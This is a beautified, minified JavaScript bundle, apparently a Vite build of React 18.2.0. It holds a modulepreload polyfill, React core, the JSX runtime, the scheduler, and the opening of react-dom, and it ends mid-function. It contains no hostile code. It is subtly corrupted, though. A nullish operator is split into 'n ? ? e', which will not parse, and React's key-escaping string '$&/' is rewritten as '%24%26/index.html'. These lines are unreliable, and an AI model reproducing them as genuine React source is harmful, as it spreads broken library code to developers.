function Kd(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const l in r)
                if (l !== "default" && !(l in e)) {
                    const o = Object.getOwnPropertyDescriptor(r, l);
                    o && Object.defineProperty(e, l, o.get ? o : {
                        enumerable: !0,
                        get: () => r[l]
                    })
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }))
}(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const l of document.querySelectorAll('link[rel="modulepreload"]')) r(l);
    new MutationObserver(l => {
        for (const o of l)
            if (o.type === "childList")
                for (const i of o.addedNodes) i.tagName === "LINK" && i.rel === "modulepreload" && r(i)
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function n(l) {
        const o = {};
        return l.integrity && (o.integrity = l.integrity), l.referrerPolicy && (o.referrerPolicy = l.referrerPolicy), l.crossOrigin === "use-credentials" ? o.credentials = "include" : l.crossOrigin === "anonymous" ? o.credentials = "omit" : o.credentials = "same-origin", o
    }

    function r(l) {
        if (l.ep) return;
        l.ep = !0;
        const o = n(l);
        fetch(l.href, o)
    }
})();

function Yd(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e
}
var pu = {
        exports: {}
    },
    ql = {},
    mu = {
        exports: {}
    },
    R = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Ar = Symbol.for("react.element"),
    Gd = Symbol.for("react.portal"),
    Xd = Symbol.for("react.fragment"),
    Zd = Symbol.for("react.strict_mode"),
    Jd = Symbol.for("react.profiler"),
    qd = Symbol.for("react.provider"),
    ef = Symbol.for("react.context"),
    tf = Symbol.for("react.forward_ref"),
    nf = Symbol.for("react.suspense"),
    rf = Symbol.for("react.memo"),
    lf = Symbol.for("react.lazy"),
    qa = Symbol.iterator;

function of (e) {
    return e === null || typeof e != "object" ? null : (e = qa && e[qa] || e["@@iterator"], typeof e == "function" ? e : null)
}
var hu = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    },
    vu = Object.assign,
    gu = {};

function Hn(e, t, n) {
    this.props = e, this.context = t, this.refs = gu, this.updater = n || hu
}
Hn.prototype.isReactComponent = {};
Hn.prototype.setState = function(e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState")
};
Hn.prototype.forceUpdate = function(e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate")
};

function yu() {}
yu.prototype = Hn.prototype;

function Xi(e, t, n) {
    this.props = e, this.context = t, this.refs = gu, this.updater = n || hu
}
var Zi = Xi.prototype = new yu;
Zi.constructor = Xi;
vu(Zi, Hn.prototype);
Zi.isPureReactComponent = !0;
var es = Array.isArray,
    wu = Object.prototype.hasOwnProperty,
    Ji = {
        current: null
    },
    xu = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function ku(e, t, n) {
    var r, l = {},
        o = null,
        i = null;
    if (t != null)
        for (r in t.ref !== void 0 && (i = t.ref), t.key !== void 0 && (o = "" + t.key), t) wu.call(t, r) && !xu.hasOwnProperty(r) && (l[r] = t[r]);
    var a = arguments.length - 2;
    if (a === 1) l.children = n;
    else if (1 < a) {
        for (var s = Array(a), u = 0; u < a; u++) s[u] = arguments[u + 2];
        l.children = s
    }
    if (e && e.defaultProps)
        for (r in a = e.defaultProps, a) l[r] === void 0 && (l[r] = a[r]);
    return {
        $$typeof: Ar,
        type: e,
        key: o,
        ref: i,
        props: l,
        _owner: Ji.current
    }
}

function af(e, t) {
    return {
        $$typeof: Ar,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    }
}

function qi(e) {
    return typeof e == "object" && e !== null && e.$$typeof === Ar
}

function sf(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function(n) {
        return t[n]
    })
}
var ts = /\/+/g;

function wo(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? sf("" + e.key) : t.toString(36)
}

function ml(e, t, n, r, l) {
    var o = typeof e;
    (o === "undefined" || o === "boolean") && (e = null);
    var i = !1;
    if (e === null) i = !0;
    else switch (o) {
        case "string":
        case "number":
            i = !0;
            break;
        case "object":
            switch (e.$$typeof) {
                case Ar:
                case Gd:
                    i = !0
            }
    }
    if (i) return i = e, l = l(i), e = r === "" ? "." + wo(i, 0) : r, es(l) ? (n = "", e != null && (n = e.replace(ts, "%24%26/index.html") + "/"), ml(l, t, n, "", function(u) {
        return u
    })) : l != null && (qi(l) && (l = af(l, n + (!l.key || i && i.key === l.key ? "" : ("" + l.key).replace(ts, "%24%26/index.html") + "/") + e)), t.push(l)), 1;
    if (i = 0, r = r === "" ? "." : r + ":", es(e))
        for (var a = 0; a < e.length; a++) {
            o = e[a];
            var s = r + wo(o, a);
            i += ml(o, t, n, s, l)
        } else if (s = of (e), typeof s == "function")
            for (e = s.call(e), a = 0; !(o = e.next()).done;) o = o.value, s = r + wo(o, a++), i += ml(o, t, n, s, l);
        else if (o === "object") throw t = String(e), Error("Objects are not valid as a React child (found: " + (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return i
}

function Gr(e, t, n) {
    if (e == null) return e;
    var r = [],
        l = 0;
    return ml(e, r, "", "", function(o) {
        return t.call(n, o, l++)
    }), r
}

function uf(e) {
    if (e._status === -1) {
        var t = e._result;
        t = t(), t.then(function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 1, e._result = n)
        }, function(n) {
            (e._status === 0 || e._status === -1) && (e._status = 2, e._result = n)
        }), e._status === -1 && (e._status = 0, e._result = t)
    }
    if (e._status === 1) return e._result.default;
    throw e._result
}
var Se = {
        current: null
    },
    hl = {
        transition: null
    },
    cf = {
        ReactCurrentDispatcher: Se,
        ReactCurrentBatchConfig: hl,
        ReactCurrentOwner: Ji
    };
R.Children = {
    map: Gr,
    forEach: function(e, t, n) {
        Gr(e, function() {
            t.apply(this, arguments)
        }, n)
    },
    count: function(e) {
        var t = 0;
        return Gr(e, function() {
            t++
        }), t
    },
    toArray: function(e) {
        return Gr(e, function(t) {
            return t
        }) || []
    },
    only: function(e) {
        if (!qi(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e
    }
};
R.Component = Hn;
R.Fragment = Xd;
R.Profiler = Jd;
R.PureComponent = Xi;
R.StrictMode = Zd;
R.Suspense = nf;
R.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = cf;
R.cloneElement = function(e, t, n) {
    if (e == null) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = vu({}, e.props),
        l = e.key,
        o = e.ref,
        i = e._owner;
    if (t != null) {
        if (t.ref !== void 0 && (o = t.ref, i = Ji.current), t.key !== void 0 && (l = "" + t.key), e.type && e.type.defaultProps) var a = e.type.defaultProps;
        for (s in t) wu.call(t, s) && !xu.hasOwnProperty(s) && (r[s] = t[s] === void 0 && a !== void 0 ? a[s] : t[s])
    }
    var s = arguments.length - 2;
    if (s === 1) r.children = n;
    else if (1 < s) {
        a = Array(s);
        for (var u = 0; u < s; u++) a[u] = arguments[u + 2];
        r.children = a
    }
    return {
        $$typeof: Ar,
        type: e.type,
        key: l,
        ref: o,
        props: r,
        _owner: i
    }
};
R.createContext = function(e) {
    return e = {
        $$typeof: ef,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }, e.Provider = {
        $$typeof: qd,
        _context: e
    }, e.Consumer = e
};
R.createElement = ku;
R.createFactory = function(e) {
    var t = ku.bind(null, e);
    return t.type = e, t
};
R.createRef = function() {
    return {
        current: null
    }
};
R.forwardRef = function(e) {
    return {
        $$typeof: tf,
        render: e
    }
};
R.isValidElement = qi;
R.lazy = function(e) {
    return {
        $$typeof: lf,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: uf
    }
};
R.memo = function(e, t) {
    return {
        $$typeof: rf,
        type: e,
        compare: t === void 0 ? null : t
    }
};
R.startTransition = function(e) {
    var t = hl.transition;
    hl.transition = {};
    try {
        e()
    } finally {
        hl.transition = t
    }
};
R.unstable_act = function() {
    throw Error("act(...) is not supported in production builds of React.")
};
R.useCallback = function(e, t) {
    return Se.current.useCallback(e, t)
};
R.useContext = function(e) {
    return Se.current.useContext(e)
};
R.useDebugValue = function() {};
R.useDeferredValue = function(e) {
    return Se.current.useDeferredValue(e)
};
R.useEffect = function(e, t) {
    return Se.current.useEffect(e, t)
};
R.useId = function() {
    return Se.current.useId()
};
R.useImperativeHandle = function(e, t, n) {
    return Se.current.useImperativeHandle(e, t, n)
};
R.useInsertionEffect = function(e, t) {
    return Se.current.useInsertionEffect(e, t)
};
R.useLayoutEffect = function(e, t) {
    return Se.current.useLayoutEffect(e, t)
};
R.useMemo = function(e, t) {
    return Se.current.useMemo(e, t)
};
R.useReducer = function(e, t, n) {
    return Se.current.useReducer(e, t, n)
};
R.useRef = function(e) {
    return Se.current.useRef(e)
};
R.useState = function(e) {
    return Se.current.useState(e)
};
R.useSyncExternalStore = function(e, t, n) {
    return Se.current.useSyncExternalStore(e, t, n)
};
R.useTransition = function() {
    return Se.current.useTransition()
};
R.version = "18.2.0";
mu.exports = R;
var v = mu.exports;
const F = Yd(v),
    xr = Kd({
        __proto__: null,
        default: F
    }, [v]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var df = v,
    ff = Symbol.for("react.element"),
    pf = Symbol.for("react.fragment"),
    mf = Object.prototype.hasOwnProperty,
    hf = df.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    vf = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };

function Su(e, t, n) {
    var r, l = {},
        o = null,
        i = null;
    n !== void 0 && (o = "" + n), t.key !== void 0 && (o = "" + t.key), t.ref !== void 0 && (i = t.ref);
    for (r in t) mf.call(t, r) && !vf.hasOwnProperty(r) && (l[r] = t[r]);
    if (e && e.defaultProps)
        for (r in t = e.defaultProps, t) l[r] === void 0 && (l[r] = t[r]);
    return {
        $$typeof: ff,
        type: e,
        key: o,
        ref: i,
        props: l,
        _owner: hf.current
    }
}
ql.Fragment = pf;
ql.jsx = Su;
ql.jsxs = Su;
pu.exports = ql;
var g = pu.exports,
    Zo = {},
    bu = {
        exports: {}
    },
    Re = {},
    Eu = {
        exports: {}
    },
    Nu = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
(function(e) {
    function t(j, $) {
        var L = j.length;
        j.push($);
        e: for (; 0 < L;) {
            var D = L - 1 >>> 1,
                Y = j[D];
            if (0 < l(Y, $)) j[D] = $, j[L] = Y, L = D;
            else break e
        }
    }

    function n(j) {
        return j.length === 0 ? null : j[0]
    }

    function r(j) {
        if (j.length === 0) return null;
        var $ = j[0],
            L = j.pop();
        if (L !== $) {
            j[0] = L;
            e: for (var D = 0, Y = j.length, ye = Y >>> 1; D < ye;) {
                var at = 2 * (D + 1) - 1,
                    Gn = j[at],
                    st = at + 1,
                    Kt = j[st];
                if (0 > l(Gn, L)) st < Y && 0 > l(Kt, Gn) ? (j[D] = Kt, j[st] = L, D = st) : (j[D] = Gn, j[at] = L, D = at);
                else if (st < Y && 0 > l(Kt, L)) j[D] = Kt, j[st] = L, D = st;
                else break e
            }
        }
        return $
    }

    function l(j, $) {
        var L = j.sortIndex - $.sortIndex;
        return L !== 0 ? L : j.id - $.id
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var o = performance;
        e.unstable_now = function() {
            return o.now()
        }
    } else {
        var i = Date,
            a = i.now();
        e.unstable_now = function() {
            return i.now() - a
        }
    }
    var s = [],
        u = [],
        f = 1,
        h = null,
        m = 3,
        y = !1,
        w = !1,
        x = !1,
        N = typeof setTimeout == "function" ? setTimeout : null,
        d = typeof clearTimeout == "function" ? clearTimeout : null,
        c = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" && navigator.scheduling !== void 0 && navigator.scheduling.isInputPending !== void 0 && navigator.scheduling.isInputPending.bind(navigator.scheduling);

    function p(j) {
        for (var $ = n(u); $ !== null;) {
            if ($.callback === null) r(u);
            else if ($.startTime <= j) r(u), $.sortIndex = $.expirationTime, t(s, $);
            else break;
            $ = n(u)
        }
    }

    function k(j) {
        if (x = !1, p(j), !w)
            if (n(s) !== null) w = !0, St(b);
            else {
                var $ = n(u);
                $ !== null && Qe(k, $.startTime - j)
            }
    }

    function b(j, $) {
        w = !1, x && (x = !1, d(E), E = -1), y = !0;
        var L = m;
        try {
            for (p($), h = n(s); h !== null && (!(h.expirationTime > $) || j && !A());) {
                var D = h.callback;
                if (typeof D == "function") {
                    h.callback = null, m = h.priorityLevel;
                    var Y = D(h.expirationTime <= $);
                    $ = e.unstable_now(), typeof Y == "function" ? h.callback = Y : h === n(s) && r(s), p($)
                } else r(s);
                h = n(s)
            }
            if (h !== null) var ye = !0;
            else {
                var at = n(u);
                at !== null && Qe(k, at.startTime - $), ye = !1
            }
            return ye
        } finally {
            h = null, m = L, y = !1
        }
    }
    var C = !1,
        T = null,
        E = -1,
        O = 5,
        P = -1;

    function A() {
        return !(e.unstable_now() - P < O)
    }

    function q() {
        if (T !== null) {
            var j = e.unstable_now();
            P = j;
            var $ = !0;
            try {
                $ = T(!0, j)
            } finally {
                $ ? fe() : (C = !1, T = null)
            }
        } else C = !1
    }
    var fe;
    if (typeof c == "function") fe = function() {
        c(q)
    };
    else if (typeof MessageChannel < "u") {
        var it = new MessageChannel,
            kt = it.port2;
        it.port1.onmessage = q, fe = function() {
            kt.postMessage(null)
        }
    } else fe = function() {
        N(q, 0)
    };

    function St(j) {
        T = j, C || (C = !0, fe())
    }

    function Qe(j, $) {
        E = N(function() {
            j(e.unstable_now())
        }, $)
    }
    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function(j) {
        j.callback = null
    }, e.unstable_continueExecution = function() {
        w || y || (w = !0, St(b))
    }, e.unstable_forceFrameRate = function(j) {
        0 > j || 125 < j ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : O = 0 < j ? Math.floor(1e3 / j) : 5
    }, e.unstable_getCurrentPriorityLevel = function() {
        return m
    }, e.unstable_getFirstCallbackNode = function() {
        return n(s)
    }, e.unstable_next = function(j) {
        switch (m) {
            case 1:
            case 2:
            case 3:
                var $ = 3;
                break;
            default:
                $ = m
        }
        var L = m;
        m = $;
        try {
            return j()
        } finally {
            m = L
        }
    }, e.unstable_pauseExecution = function() {}, e.unstable_requestPaint = function() {}, e.unstable_runWithPriority = function(j, $) {
        switch (j) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                j = 3
        }
        var L = m;
        m = j;
        try {
            return $()
        } finally {
            m = L
        }
    }, e.unstable_scheduleCallback = function(j, $, L) {
        var D = e.unstable_now();
        switch (typeof L == "object" && L !== null ? (L = L.delay, L = typeof L == "number" && 0 < L ? D + L : D) : L = D, j) {
            case 1:
                var Y = -1;
                break;
            case 2:
                Y = 250;
                break;
            case 5:
                Y = 1073741823;
                break;
            case 4:
                Y = 1e4;
                break;
            default:
                Y = 5e3
        }
        return Y = L + Y, j = {
            id: f++,
            callback: $,
            priorityLevel: j,
            startTime: L,
            expirationTime: Y,
            sortIndex: -1
        }, L > D ? (j.sortIndex = L, t(u, j), n(s) === null && j === n(u) && (x ? (d(E), E = -1) : x = !0, Qe(k, L - D))) : (j.sortIndex = Y, t(s, j), w || y || (w = !0, St(b))), j
    }, e.unstable_shouldYield = A, e.unstable_wrapCallback = function(j) {
        var $ = m;
        return function() {
            var L = m;
            m = $;
            try {
                return j.apply(this, arguments)
            } finally {
                m = L
            }
        }
    }
})(Nu);
Eu.exports = Nu;
var gf = Eu.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var Cu = v,
    Oe = gf;

function S(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
}
var Tu = new Set,
    kr = {};

function cn(e, t) {
    Rn(e, t), Rn(e + "Capture", t)
}

function Rn(e, t) {
    for (kr[e] = t, e = 0; e < t.length; e++) Tu.add(t[e])
}
var vt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    Jo = Object.prototype.hasOwnProperty,
    yf = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    ns = {},
    rs = {};

function wf(e) {
    return Jo.call(rs, e) ? !0 : Jo.call(ns, e) ? !1 : yf.test(e) ? rs[e] = !0 : (ns[e] = !0, !1)
}

function xf(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r ? !1 : n !== null ? !n.acceptsBooleans : (e = e.toLowerCase().slice(0, 5), e !== "data-" && e !== "aria-");
        default:
            return !1
    }
}

function kf(e, t, n, r) {
    if (t === null || typeof t > "u" || xf(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return t === !1;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t
    }
    return !1
}

function be(e, t, n, r, l, o, i) {
    this.acceptsBooleans = t === 2 || t === 3 || t === 4, this.attributeName = r, this.attributeNamespace = l, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = o, this.removeEmptyString = i
}
var ce = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e) {
    ce[e] = new be(e, 0, !1, e, null, !1, !1)
});
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"]
].forEach(function(e) {
    var t = e[0];
    ce[t] = new be(t, 1, !1, e[1], null, !1, !1)
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function(e) {
    ce[e] = new be(e, 2, !1, e.toLowerCase(), null, !1, !1)
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function(e) {
    ce[e] = new be(e, 2, !1, e, null, !1, !1)
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e) {
    ce[e] = new be(e, 3, !1, e.toLowerCase(), null, !1, !1)
});
["checked", "multiple", "muted", "selected"].forEach(function(e) {
    ce[e] = new be(e, 3, !0, e, null, !1, !1)
});
["capture", "download"].forEach(function(e) {
    ce[e] = new be(e, 4, !1, e, null, !1, !1)
});
["cols", "rows", "size", "span"].forEach(function(e) {
    ce[e] = new be(e, 6, !1, e, null, !1, !1)
});
["rowSpan", "start"].forEach(function(e) {
    ce[e] = new be(e, 5, !1, e.toLowerCase(), null, !1, !1)
});
var ea = /[\-:]([a-z])/g;

function ta(e) {
    return e[1].toUpperCase()
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e) {
    var t = e.replace(ea, ta);
    ce[t] = new be(t, 1, !1, e, null, !1, !1)
});
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e) {
    var t = e.replace(ea, ta);
    ce[t] = new be(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
});
["xml:base", "xml:lang", "xml:space"].forEach(function(e) {
    var t = e.replace(ea, ta);
    ce[t] = new be(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
});
["tabIndex", "crossOrigin"].forEach(function(e) {
    ce[e] = new be(e, 1, !1, e.toLowerCase(), null, !1, !1)
});
ce.xlinkHref = new be("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function(e) {
    ce[e] = new be(e, 1, !1, e.toLowerCase(), null, !0, !0)
});

function na(e, t, n, r) {
    var l = ce.hasOwnProperty(t) ? ce[t] : null;
    (l !== null ? l.type !== 0 : r || !(2 < t.length) || t[0] !== "o" && t[0] !== "O" || t[1] !== "n" && t[1] !== "N") && (kf(t, n, l, r) && (n = null), r || l === null ? wf(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : l.mustUseProperty ? e[l.propertyName] = n === null ? l.type === 3 ? !1 : "" : n : (t = l.attributeName, r = l.attributeNamespace, n === null ? e.removeAttribute(t) : (l = l.type, n = l === 3 || l === 4 && n === !0 ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
}
var xt = Cu.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    Xr = Symbol.for("react.element"),
    hn = Symbol.for("react.portal"),
    vn = Symbol.for("react.fragment"),
    ra = Symbol.for("react.strict_mode"),
    qo = Symbol.for("react.profiler"),
    Pu = Symbol.for("react.provider"),
    ju = Symbol.for("react.context"),
    la = Symbol.for("react.forward_ref"),
    ei = Symbol.for("react.suspense"),
    ti = Symbol.for("react.suspense_list"),
    oa = Symbol.for("react.memo"),
    Nt = Symbol.for("react.lazy"),
    _u = Symbol.for("react.offscreen"),
    ls = Symbol.iterator;

function Xn(e) {
    return e === null || typeof e != "object" ? null : (e = ls && e[ls] || e["@@iterator"], typeof e == "function" ? e : null)
}
var K = Object.assign,
    xo;

function ir(e) {
    if (xo === void 0) try {
        throw Error()
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        xo = t && t[1] || ""
    }
    return `
` + xo + e
}
var ko = !1;

function So(e, t) {
    if (!e || ko) return "";
    ko = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (t = function() {
                    throw Error()
                }, Object.defineProperty(t.prototype, "props", {
                    set: function() {
                        throw Error()
                    }
                }), typeof Reflect == "object" && Reflect.construct) {
                try {
                    Reflect.construct(t, [])
                } catch (u) {
                    var r = u
                }
                Reflect.construct(e, [], t)
            } else {
                try {
                    t.call()
                } catch (u) {
                    r = u
                }
                e.call(t.prototype)
            }
        else {
            try {
                throw Error()
            } catch (u) {
                r = u
            }
            e()
        }
    } catch (u) {
        if (u && r && typeof u.stack == "string") {
            for (var l = u.stack.split(`
`), o = r.stack.split(`
`), i = l.length - 1, a = o.length - 1; 1 <= i && 0 <= a && l[i] !== o[a];) a--;
            for (; 1 <= i && 0 <= a; i--, a--)
                if (l[i] !== o[a]) {
                    if (i !== 1 || a !== 1)
                        do
                            if (i--, a--, 0 > a || l[i] !== o[a]) {
                                var s = `
` + l[i].replace(" at new ", " at ");
                                return e.displayName && s.includes("<anonymous>") && (s = s.replace("<anonymous>", e.displayName)), s
                            }
                    while (1 <= i && 0 <= a);
                    break
                }
        }
    } finally {
        ko = !1, Error.prepareStackTrace = n
    }
    return (e = e ? e.displayName || e.name : "") ? ir(e) : ""
}

function Sf(e) {
    switch (e.tag) {
        case 5:
            return ir(e.type);
        case 16:
            return ir("Lazy");
        case 13:
            return ir("Suspense");
        case 19:
            return ir("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = So(e.type, !1), e;
        case 11:
            return e = So(e.type.render, !1), e;
        case 1:
            return e = So(e.type, !0), e;
        default:
            return ""
    }
}

function ni(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case vn:
            return "Fragment";
        case hn:
            return "Portal";
        case qo:
            return "Profiler";
        case ra:
            return "StrictMode";
        case ei:
            return "Suspense";
        case ti:
            return "SuspenseList"
    }
    if (typeof e == "object") switch (e.$$typeof) {
        case ju:
            return (e.displayName || "Context") + ".Consumer";
        case Pu:
            return (e._context.displayName || "Context") + ".Provider";
        case la:
            var t = e.render;
            return e = e.displayName, e || (e = t.displayName || t.name || "", e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case oa:
            return t = e.displayName || null, t !== null ? t : ni(e.type) || "Memo";
        case Nt:
            t = e._payload, e = e._init;
            try {
                return ni(e(t))
            } catch {}
    }
    return null
}

function bf(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = t.render, e = e.displayName || e.name || "", t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return ni(t);
        case 8:
            return t === ra ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t
    }
    return null
}

function Wt(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return ""
    }
}

function $u(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
}

function Ef(e) {
    var t = $u(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var l = n.get,
            o = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function() {
                return l.call(this)
            },
            set: function(i) {
                r = "" + i, o.call(this, i)
            }
        }), Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }), {
            getValue: function() {
                return r
            },
            setValue: function(i) {
                r = "" + i
            },
            stopTracking: function() {
                e._valueTracker = null, delete e[t]
            }
        }
    }
}

function Zr(e) {
    e._valueTracker || (e._valueTracker = Ef(e))
}

function Lu(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = $u(e) ? e.checked ? "true" : "false" : e.value), e = r, e !== n ? (t.setValue(e), !0) : !1
}

function Tl(e) {
    if (e = e || (typeof document < "u" ? document : void 0), typeof e > "u") return null;
    try {
        return e.activeElement || e.body
    } catch {
        return e.body
    }
}

function ri(e, t) {
    var n = t.checked;
    return K({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ? ? e._wrapperState.initialChecked
    })
}

function os(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue,
        r = t.checked != null ? t.checked : t.defaultChecked;
    n = Wt(t.value != null ? t.value : n), e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}

function Fu(e, t) {
    t = t.checked, t != null && na(e, "checked", t, !1)
}

function li(e, t) {
    Fu(e, t);
    var n = Wt(t.value),
        r = t.type;
    if (n != null) r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return
    }
